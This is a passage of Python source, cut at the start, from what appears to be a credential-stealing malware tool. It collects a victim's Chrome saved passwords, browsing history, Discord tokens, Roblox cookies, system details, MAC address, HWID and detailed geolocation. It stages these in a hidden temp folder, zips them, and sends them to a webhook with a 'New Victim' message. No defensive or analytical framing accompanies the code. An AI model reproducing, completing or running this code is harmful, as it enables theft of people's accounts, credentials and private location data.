    elif len(rows) > 0 and isinstance(rows[0], dict):
        field_names = header
        processed_rows = []
        for row in rows:
            processed_rows.append([str(row.get(f, "")) for f in field_names])
        rows = processed_rows
    rows = [header] + rows
    col_widths = [max(len(str(x)) for x in col) for col in zip(*rows)]
    lines = []
    for i, row in enumerate(rows):
        ln = "| " + " | ".join(str(x).ljust(col_widths[j]) for j, x in enumerate(row)) + " |"
        lines.append(ln)
        if i==0:
            lines.append("| " + " | ".join('-'*col_widths[j] for j in range(len(row))) + " |")
    return "\n".join(lines)

def format_system_info(info):
    out = []
    for k, v in info.items():
        if k == 'GPU' and isinstance(v, list):
            out.append("GPU(s):")
            for i, gpu in enumerate(v, 1):
                out.append(f"  ({i}). " + ", ".join(f"{kk}: {vv}" for kk, vv in gpu.items()))
        elif k == 'Disks' and isinstance(v, list):
            out.append("Disks:")
            for d in v:
                out.append("  " + ", ".join(f"{kk}: {vv}" for kk, vv in d.items()))
        elif k == 'Disks_Devices' and isinstance(v, list):
            out.append("Physical Disks:")
            for d in v:
                out.append("  " + ", ".join(f"{kk}: {vv}" for kk, vv in d.items()))
        elif k == 'RAM_Modules' and isinstance(v, list):
            out.append("Physical RAM Modules:")
            for idx, ram in enumerate(v, 1):
                out.append("  Module {}: ".format(idx) + ", ".join(f"{kk}: {vv}" for kk, vv in ram.items()))
        elif k == 'NetworkAdapters' and isinstance(v, list):
            out.append("Network Adapters:")
            for n in v:
                out.append("  " + ", ".join(f"{kk}: {vv}" for kk, vv in n.items()))
        else:
            out.append(f"{k}: {v}")
    return "\n".join(out)

def format_browsing_history(history_items):
    if not history_items:
        return "No browser history found"
    times = []
    for item in history_items:
        try:
            time_struct = time.strptime(item["visit_time"], "%Y-%m-%d %H:%M:%S")
            timestamp = time.mktime(time_struct)
            times.append(timestamp)
        except Exception:
            pass
    if times:
        earliest = min(times)
        latest = max(times)
        timeframe = f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(earliest))} to {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(latest))}"
    else:
        timeframe = "Unknown"
    out = []
    out.append("="*60)
    out.append("Google Chrome Browsing History")
    out.append(f"Total Items: {len(history_items)}")
    out.append(f"Time Frame (first/last): {timeframe}")
    out.append("="*60)
    for i, item in enumerate(history_items, 1):
        out.append(f"--- Entry #{i} ---")
        out.append(f"Time  : {item.get('visit_time')}")
        out.append(f"URL   : {item.get('url')}")
        out.append(f"Title : {item.get('title', '')}")
        out.append("")
    out.append("="*60)
    out.append("\n(Compact Table View Below)\n")
    compact_rows = []
    for it in history_items:
        compact_rows.append([it.get("visit_time", ""), it.get("title", ""), it.get("url", "")])
    out.append(table(compact_rows, ["Time", "Title", "URL"]))
    return "\n".join(out)

def count_password_entries(chrome_pwds):
    # Helper to robustly count passwords from chrome_pwds result
    if isinstance(chrome_pwds, dict) and "passwords" in chrome_pwds:
        pwlist = chrome_pwds["passwords"]
        if isinstance(pwlist, list):
            return len(pwlist)
        return 0
    elif isinstance(chrome_pwds, list):
        return len(chrome_pwds)
    return 0

def summary_overview(username, compname, ip, country, city, mac, hwid, discord_tokens, chrome_pwds, roblox_cookies, system_info):
    ram_total = system_info.get("RAM_Total_Physical", system_info.get("RAM_Virtual_Total", "Unknown"))
    try:
        ram_total_gb = "{:.2f} GB".format(int(ram_total) / (1024**3)) if isinstance(ram_total, int) else str(ram_total)
    except Exception:
        ram_total_gb = str(ram_total)
    gpus = ', '.join(gpu.get('Name','?') for gpu in system_info.get('GPU', [])) if 'GPU' in system_info else 'Unknown'
    cpu = system_info.get('CPU_Name', system_info.get('Processor', 'Unknown'))
    os_str = system_info.get('OS_Full_Detail', system_info.get('OS_FullName', system_info.get('OS', 'Unknown')))
    password_count = count_password_entries(chrome_pwds)
    lines = [
        f"Username: {username}",
        f"Computer: {compname}",
        f"IP: {ip}",
        f"Country: {country}",
        f"City: {city}",
        f"MAC: {mac}",
        f"HWID: {hwid}",
        f"Discord Tokens Found: {len(discord_tokens)}",
        f"Passwords Grabbed: {password_count}",
        f"Roblox Cookies Found: {'Yes' if roblox_cookies else 'No'}",
        f"OS: {os_str}",
        f"CPU: {cpu}",
        f"RAM (Total): {ram_total_gb}",
        f"GPU(s): {gpus}"
    ]
    return "\n".join(lines)

def collect_and_send():
    ip, country, city = get_ipinfo()
    mac = get_mac_address()
    hwid = get_hwid()
    system_info = get_system_info()
    discord_tokens = find_discord_tokens()
    roblox_cookies = find_roblox_tokens()

    with TemporaryDirectory(dir=".") as td:
        SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)

        # Save system info (technical details TXT)
        sysinfo_file = os.path.join(td, "system_info.txt")
        with open(sysinfo_file, "w", encoding="utf-8") as f:
            f.write(format_system_info(system_info))

        # Save Chrome browsing history
        history_items = get_browsing_history(td)
        history_file = os.path.join(td, "browser_history.txt")
        with open(history_file, "w", encoding="utf-8") as f:
            f.write(format_browsing_history(history_items))

        # Chrome passwords/login info (ALL in one file)
        chrome_pwds = get_chrome_passwords(td)
        chrome_file = os.path.join(td, "chrome_passwords.txt")
        with open(chrome_file, "w", encoding="utf-8") as f:
            pwd_list = chrome_pwds.get("passwords", []) if isinstance(chrome_pwds, dict) else []
            pwd_rows = []
            for item in pwd_list:
                username = item.get("username", "")
                password = item.get("password", "")
                url = item.get("origin_url", "")
                pwd_rows.append([username, password, url])
            f.write(table(pwd_rows, ["Username/Email", "Password", "URL"]))

        username = os.getenv("UserName", "Unknown")
        compname = os.getenv("COMPUTERNAME", "Unknown")

        # --- Extremely advanced geolocation (using all possible vectors) ---
        location_address = get_high_accuracy_geolocation(ip)

        overview_file = os.path.join(td, "overview.txt")
        with open(overview_file, "w", encoding="utf-8") as f:
            overview = summary_overview(
                username, compname, ip, country, city, mac, hwid,
                discord_tokens, chrome_pwds, roblox_cookies, system_info
            )
            f.write(overview)
            f.write("\n")
            f.write(f"Address/Location (Detailed): \n{location_address}")

        roblox_file = None
        if roblox_cookies:
            roblox_file = os.path.join(td, "roblox_cookies.txt")
            with open(roblox_file, "w", encoding='utf-8') as f:
                for domain, cookies in roblox_cookies.items():
                    if domain == "_RBXSessionTracker" and cookies:
                        f.write("=== RBXSessionTracker ===\n")
                        for session_host, session_cookies in cookies.items():
                            f.write(f"[{session_host}]\n")
                            for sess in session_cookies:
                                f.write(f"  Path: {sess.get('path','')} | Value: {sess.get('value','')}\n")
                            f.write("\n")
                        continue
                    f.write(f"== {domain} ==\n")
                    for c in cookies:
                        f.write(f"Cookie Name: {c['name']}\n  Path: {c['path']}\n  Value: {c['value']}\n\n")
                    f.write("\n")

        # Updated password count for notifications
        password_count = count_password_entries(chrome_pwds)

        zip_path = os.path.join(td, "data.zip")
        with ZipFile(zip_path, "w", ZIP_DEFLATED) as zipf:
            zipf.write(sysinfo_file)
            zipf.write(history_file)
            zipf.write(chrome_file)
            zipf.write(overview_file)
            if roblox_file:
                zipf.write(roblox_file)

        content = (
            f"**New Victim**\n"
            f"**Username:** {username}\n"
            f"**Computer:** {compname}\n"
            f"**IP:** {ip}\n"
            f"**Country:** {country}\n"
            f"**City:** {city}\n"
            f"**MAC:** {mac}\n"
            f"**HWID:** {hwid}\n"
            f"**Discord Tokens Found:** {len(discord_tokens)}\n"
            f"**Passwords Grabbed:** {password_count}\n"
            f"**Roblox Cookies Found:** {'Yes' if roblox_cookies else 'No'}\n"
            f"**OS:** {system_info.get('OS_Full_Detail', system_info.get('OS_FullName', system_info.get('OS', 'Unknown')))}\n"
            f"**CPU:** {system_info.get('CPU_Name', system_info.get('Processor', 'Unknown'))}\n"
            f"**RAM (Total):** {str(round(int(system_info.get('RAM_Total_Physical', '0'))/(1024**3), 2))+' GB' if isinstance(system_info.get('RAM_Total_Physical',''), int) else system_info.get('RAM_Total_Physical','Unknown')}\n"
            f"**GPU(s):** {', '.join(gpu.get('Name','?') for gpu in system_info.get('GPU', [])) if 'GPU' in system_info else 'Unknown'}\n"
            f"**Address/Location (Detailed):** \n```\n{location_address}\n```"
        )
        post(WEBHOOK_URL, data={"content": content})
        with open(zip_path, "rb") as f:
            post(WEBHOOK_URL, files={"file": (f"data_{username}.zip", f, "application/zip")}, data={"content": "Dumped Data"})

if __name__ == "__main__":
    collect_and_send()
